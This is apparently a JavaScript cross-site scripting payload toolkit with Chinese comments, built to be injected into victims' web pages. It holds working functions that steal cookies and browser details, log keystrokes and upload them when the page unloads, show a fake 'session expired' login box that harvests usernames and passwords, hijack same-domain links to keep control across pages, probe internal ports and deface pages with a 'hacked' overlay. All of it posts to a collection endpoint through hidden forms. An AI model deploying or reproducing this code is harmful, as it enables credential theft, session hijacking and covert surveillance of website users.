var xss = {
    server: null,

    getUrlParam: function (p) {
        var vars = location.search.substring(1).split("&");
        for (var i=0; i < vars.length; i++) {
            var pair = vars[i].split("=");
            if(pair[0] == p){return pair[1];}
        }
    },

    loadScript: function (url, bom) {
        var e = document.createElement('script');
        e.type = 'text/javascript';
        e.src = url;
        (bom || window).document.body.appendChild(e);
    },

    loadStyle: function (url, bom) {
        var e = document.createElement('link');
        e.type = 'text/css';
        e.rel = 'stylesheet';
        e.href = url;
        (bom || window).document.getElementsByTagName('head')[0].appendChild(e);
    },

    loadStyleString: function (style, bom) {
        var e = document.createElement('style');
        e.type = 'text/css';
        try{
            e.appendChild(document.createTextNode(style));
        }catch(e) {
            e.styleSheet.cssText = style;
        }
        (bom || window).document.getElementsByTagName('head')[0].appendChild(e);
    },

    /*
         在当前页面 针对同域链接实施浏览器劫持
         当打开的链接和当前页面是同域时
         将指定的js注入新打开的页面 持久化控制
         如果是不同域的代码会因浏览器安全策略报错
    */
    hookLinks: function (url){
    // 从url中提取域名结果形如 http://www.xxx.com/
        function getUrl(url){
            var url = url.match(/((https?:\/\/.+?)\/|(https?:\/\/.+))/i)[0];
            return (url[url.length -1] !== '/') ? url + '/' : url;
        }
        for (var i = 0; i < document.links.length; i++){
            // 如果链接和当前页面同域 劫持之
            if(getUrl(url) === getUrl(document.links[i].href)){
                document.links[i].onclick = function (event) {
                    var win = window.open(event.currentTarget.href);
                    setTimeout(function(){loadScript(url, win)}, 5000);
                    return false;
                };
            }
        }
    },

    /* 利用函数注释生成原样字符串
    */
    rawString: function(func) {
        func += '';
        return func.substring(func.indexOf("/*") + 2, func.lastIndexOf("*/"));
    },

    // 移除节点
    removeNode: function (node) {
        node.parentNode.removeChild(node);
    },

    createElements: function (str, element, attribute, parentNode){
        var e = document.createElement(element || 'div'),
            parentNode = parentNode || document.body;

        if(typeof str === 'function') {
            str += '';
            str = str.substring(str.indexOf("/*") + 2, str.lastIndexOf("*/"));
        }
        if((typeof attribute === "object") && (attribute.constructor === Object)){
            for(var i in attribute){
                e.setAttribute(i, attribute[i]);
            }
        }
        e.innerHTML = str;
        parentNode.appendChild(e);
        return e;
    },

    /*
     跨浏览器事件处理模块

        addHandler(document.getElementById('in'), 'keypress', function(event){
            event = getEvent(event);
            event.preventDefault();
            event.stopPropagation();
        });
     */
    addHandler: function(element, type, handler) {
        if(element.addEventListener){
            element.addEventListener(type, handler, false);
        } else if(element.attachEvent){
            element.attachEvent("on" + type, handler);
        } else {
            element["on" + type] = handler;
        }
    },

    removeHandler: function (element, type, handler) {
        if (element.removeEventListener) {
            element.removeEventListener(type, handler, false);
        } else if (element.detachEvent) {
            element.detachEvent("on" + type, handler);
        } else {
            element["on" + type] = null;
        }
    },

    getEvent: function (event) {
        event = event || window.event;
        event.target = event.target || event.srcElement;

        // 键盘事件兼容 ie8及以下 charCode 在 keyCode 中
        event.charCode = (typeof event.charCode === "number")? event.charCode : event.keyCode;
        event.key = String.fromCharCode(event.charCode);
        event.preventDefault = event.preventDefault || function() {
            this.returnValue = false;
        };

        event.stopPropagation = event.stopPropagation || function(){
            this.cancelBubble = true;
        };
        return event;
    },

    csPost: function (url, data) {
        var d=document,f=d.body.appendChild(d.createElement('iframe')),c=f.contentDocument;
        f.style.display = 'none';
        c.write('<form method="POST" action="http://'+url+'"><input name="d"></form>');
        c.forms[0].d.value=typeof data=='string'?data:JSON.stringify(data);
        c.forms[0].submit();
        setTimeout(function(){d.body.removeChild(f)},100);
    },

    postData: function (url, type, payload) {
        var d=document,n=navigator;
        xss.csPost(url, {
            type: type || 'default',
            url: d.URL,
            referrer: d.referrer,
            userAgent: n.userAgent,
            platform: n.platform,
            title: d.title,
            language: n.language,
            screen: screen.width+'x'+screen.height,
            cookie: d.cookie,
            payload: payload,
        });
    },

    upload: function(data, type) {
        xss.postData('/well/channel.php', type, data);
        // data = JSON.stringify([data]);
        // var d = btoa(encodeURI(data)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, ".");
        // new Image().src = xss.server + '?action=' + action + '&data=' + d;
    },

    stealClientInfo: function() {
        xss.upload('clientInfo', {
            url: document.URL,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            title: document.title,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            cookie: document.cookie
        });
    },

    // 探测主机端口 不太稳定 有的端口打开了也探测不到 有的可以
    ping: function (ip, port, callback) {
        var img = document.createElement('img');

        img.onload = img.onerror = function () {
            if(!img) return;
            img = null;
            callback(true);
        };

        img.src = 'http://' + ip + ':' + port;
        setTimeout(function(){
            if(!img) return;
            img = null;
            callback(false);
        }, 1000);
    },

    // 创建隐藏表单发起post、get请求
    // 例 sendForm('http://127.0.0.1/log?', {username: 2, password: 24});
    sendForm: function (url, inputs, method){
        var e = null,
            form = document.createElement('form');

        method = method || 'post';
        form.method = method;
        form.action = url;
        document.body.appendChild(form);

        for(var i in inputs){
            e = document.createElement('input');
            e.type = 'text';
            e.name = i;
            e.value = inputs[i];
            e.style.display = 'none';
            form.appendChild(e);
        }
        form.submit();
    },

    // 检测图片是否能加载成功
    checkImage: function (url, callback){
        var img = document.createElement('img');
        img.onload = function(){callback(true)};
        img.onerror = function(){callback(false)};
        img.src = url;
    },

    is_le_ie8: function () {
        // 判断ie8及之前的ie浏览器
        // IE8及之前 substr(-2) 传入负数会返回原字符 IE9之后修复了
        return 'aa'.substr(-1) === 'aa';
    },

    // 滚动条滚动位置 top 纵滚动距离 left横距离
    getScroll: function (){
        return {
            left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
            top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
        };
    },

    /*
     random 模块

     randint [m, n] 之间随机整数
     random [0, 1) 之间随机小数
     sample 从数组中随机选取n个元素作为新列表返回
     choice 从数组随机抽取一个元素
     shuffle 打乱数组顺序
     uniform [m, n) 之间随机小数
     choices 按权重随机抽取一个元素
     */
    random: {
        choice: function(list) {return list[Math.floor(Math.random() * list.length)];},
        shuffle: function(list) {return xss.random.sample(list, list.length);},
        randint: function(m, n) {return Math.floor(Math.random() * (n - m + 1)) + m;},
        random: function() {return Math.random();},

        sample: function(list, n) {
            var result = [], num = 0, list_local = list.slice();
            while (result.length < n) {
                num = xss.random.randint(0, list_local.length - 1);
                result.push(list_local[num]);
                list_local.splice(num, 1);
            }
            return result;
        },
    },

    /*
    * ajax跨浏览器简封装模块
    *
    * 同步get请求, 请求完成后返回XMLHttpRequest对象:
    *   var xhr = xss.ajax.get("http://www.a.com");
    *
    * 异步get请求, 请求完成后xhr对象将传入callback中:
    *   xss.ajax.get("http://www.a.com", function(xhr){
    *       console.log(xhr.responseText);
    *   });
    *
    * 同步post请求
    * var xhr = xss.ajax.post("http://www.a.com", "username=a&password=b");
    *
    * 异步post请求,自行构造post参数
    * xss.ajax.post("http://www.a.com", "username=a&password=b", function(xhr){
    *   console.log(xhr.responseText);
    * });
    */
    create_xhr: function () {
        if(window.XMLHttpRequest){
            return new XMLHttpRequest();
        } else {
            for(var i in {"Msxml3":0, "Msxml2":0, "Microsoft":0})
                try {return new ActiveXObject(i + ".XMLHTTP");} catch (e) {};
        }
    },

    post: function(url, params, callback) {
        var request = xss.ajax.create_xhr(),
            params = params || "";

        request.onreadystatechange = function() {
            if (request.readyState === 4) {
                callback(request.responseText);
            }
        };
        request.open('POST', url);
        request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        request.send(params);
    },

    get: function (url, callback) {
        var request = xss.ajax.create_xhr();

        request.onreadystatechange = function() {
            if (request.readyState === 4) {
                callback(request.responseText);
            }
        };
        request.open('GET', url);
        request.send(null);
    },

    html: function(url, callback) {
        var request = xss.ajax.create_xhr();

        request.onreadystatechange = function() {
            if (request.readyState === 4) {
                callback(request.responseXML);
            }
        };
        request.open('GET', url);
        request.responseType = "document";
        request.send(null);
    },

    ping: function (url, callback) {
        var request = xss.ajax.create_xhr(),
            start = new Date(),
            time = 0;

        request.onreadystatechange = function(){
            if (request.readyState === 4){
                time = (new Date()).getTime() - start.getTime();
                callback(time < 1000);
            }
        }
        request.open('GET', url);
        request.send();
    },


    getCookie: function (key) {
        var a, r = new RegExp("(^| )" + key + "=([^;]*)(;|$)");
        if (a = document.cookie.match(r))
            return unescape(a[2]);
    },

    delCookie: function (key) {
        document.cookie = key + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;";
    },

    setCookie: function (key, value, t) {
        var d = new Date();
        var exp = arguments.length == 3 ? t : 9999 * 24 * 60 * 60 * 1000;
        d.setTime(d.getTime() + exp);
        document.cookie = key + "=" + value + ";expires=" + d.toGMTString();
    },

    isMobile: function() {
        return false;
    },

    loadhackpage: function(t) {
        function rawString(f){
            f = f + '';
            return f.substring(f.indexOf("/*") + 2, f.lastIndexOf("*/"));
        }
        //         opacity: 0.1;
        var style = rawString(function(){
            /*
        .logoHacked-text {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            color: #00FF00;
            z-index: 1000000000000;
            background-color: black;
        }
            */
        });
        var e = document.createElement('style');
        e.type = 'text/css';
        try{
            e.appendChild(document.createTextNode(style));
        }catch(e){
            e.styleSheet.cssText = style;
        }

        document.getElementsByTagName('head')[0].appendChild(e);

        var div = document.createElement('div');
        div.className = 'logoHacked-text';
        div.style.fontSize = '20px';//isMobile ? "40px" : "70px";
        div.innerText = t || 'any questions \ncontact me: ???';
        document.body.appendChild(div);
    },

    keylogger: function () {
        var timeStart = new Date(),
            log = '';

        xss.addHandler(document, 'keydown', function (e) {
            var e = e || event,
                key = e.keyCode || e.which || e.charCode,
                keyMap = {
                    13: 'enter', 32: 'space', 46: 'delete', 8: 'backSpace',
                    9: 'tab', 27: 'esc', 37: 'left', 38: 'up', 39: 'right', 40: 'down',
                    33: 'pageUp', 34: 'pageDown', 35: 'end', 36: 'home',
                    16: 'shift', 17: 'ctrl', 18: 'alt', 20: 'capsLock',
                    186: ';', 187: '=', 188: ',', 189: '-', 190: '.', 191: '/', 192: '`',
                    219: '[', 220: '\\', 221: ']'
                };
            var k = keyMap[key] !== undefined ? '[' + keyMap[key] + ']' : String.fromCharCode(key);
            if ([186, 187, 188, 189, 190, 191, 192, 219, 220, 221].indexOf(key) >= 0) {
                k = k.slice(1, -1);
            }
            log += k;
        });

        xss.addHandler(window, 'beforeunload', function (e) {
            xss.upload('keyListener', {start: timeStart, end: new Date(), log: log});
        });
    }
};


window.onerror = function (msg, url, line, col, error) {
    //console.log('[LINE:' + line + '] [ERROR:' + msg + ']' + 'url:'+url + '|error:'+error+'|col:'+col);
    //return true;
};


xss.fishing = function () {
    // 创建伪造的模态框 诱使用户输入账户密码 点登陆后 推送账户密码至接收模块
    if(!document.getElementsByClassName("fishing-dialog-overlay")[0]){
        // 创建样式表
        xss.createElements(function(){
        /*
        <style>
        .fishing-dialog-overlay {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: 9999999999px;
            z-index: 2147483646;
            background-color: black;
            opacity: 0.8;
            visibility: hidden;
        }
        .fishing-dialog-box{
            visibility: hidden;
            position: fixed;
            left: 50%;
            top: 39%;
            transform: translate(-50%,-50%);

            width: 270px;
            height: 204px;
            border: 1px solid rgb(204, 208, 212);
            margin: 20px 0px 0px;
            padding: 26px 24px 46px;
            background-color: #ffffff;
            z-index: 2147483647;
            border-radius: 6px;
        }

        .fishing-input {
            width: 270px;
            height: 40px;
            background: rgb(251, 251, 251) none repeat scroll 0% 0% / auto padding-box border-box;
            border: 1px solid rgb(126, 137, 147);
            border-radius: 4px;
            font: 24px / 32px -apple-system, system-ui, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            padding: 3px 5px;
            margin: 0px 6px 16px 0px;
            outline: rgb(50, 55, 60) none 0px;
        }

.fishing-input:focus {
    border-color: #337cb5;
    border-width: 2px;
}

.fishing-button {
    border: 1px solid rgb(0, 124, 186);
    width: 58px;
    height: 40px;
    font: 14px / 38px -apple-system, system-ui, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    background: rgb(0, 124, 186) none repeat scroll 0% 0% / auto padding-box border-box;
    color: rgb(255, 255, 255);
    border-radius: 3px;
    outline: rgb(255, 255, 255) none 0px;
    cursor: pointer;
    margin: 0px 0px 4px;
    padding: 0px 14px;
    float: right;
}

.fishing-button:hover {
    background: #2e719d;
}

.fishing-button:active {
    background: #286697;
}

.fishing-label {
    font: 14px / 21px -apple-system, system-ui, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    color: rgb(68, 68, 68);
    margin: 0px 0px 3px;
    padding: 0px;
    border: 0px none rgb(68, 68, 68);
    cursor: pointer;
    height: 21px;
    display: inline-block;
}

.fishing-check {
    border: 1px solid rgb(126, 137, 147);
    width: 25px;
    height: 25px;
    display : inline-block;
}

.fishing-div {
    width: 270px;
    height: 80px;
    margin: -4px 4px 0px 0px;
    cursor: pointer;
}

        </style>
        */
        });

        // 创建钓鱼登陆框
        xss.createElements(function(){
            /*
<div class="fishing-dialog-overlay"></div>

<form name="auth-dialog-form" class="fishing-dialog-box">
    <div class="fishing-div">
    <label class="fishing-label">用户名或电子邮件地址</label>
    <input type="text" name="username" class="fishing-input">
    </div>

    <div class="fishing-div">
    <label class="fishing-label">密码</label>
    <input type="password" name="password" class="fishing-input">
    </div>
    
    <label class="fishing-label" style="color:red;margin-top:8px;">您的会话已过期请登录后再试</label>
    <input type="submit" value="登录" class="fishing-button">
</form>
*/
        });
    }

    document.forms["auth-dialog-form"].onsubmit = function (event){
        var username = this.username.value,
            password = this.password.value;

        if (username == '' || password == '') {return false;}
        xss.upload('fishing', {username: username, password: password});
        document.getElementsByClassName("fishing-dialog-overlay")[0].style.visibility = "hidden";
        document.getElementsByClassName("fishing-dialog-box")[0].style.visibility = "hidden";
        //种下cookie 避免每次都弹出对话框 如果cookie已存在，就不再弹出对话框
        xss.setCookie('fishing', '1');
        console.log(this.username.value);
        return false;
    };
    // 显示伪造的登陆框
    if (xss.getCookie('fishing') !== '1') {
        document.getElementsByClassName("fishing-dialog-overlay")[0].style.visibility = "visible";
        document.getElementsByClassName("fishing-dialog-box")[0].style.visibility = "visible";
    }
}
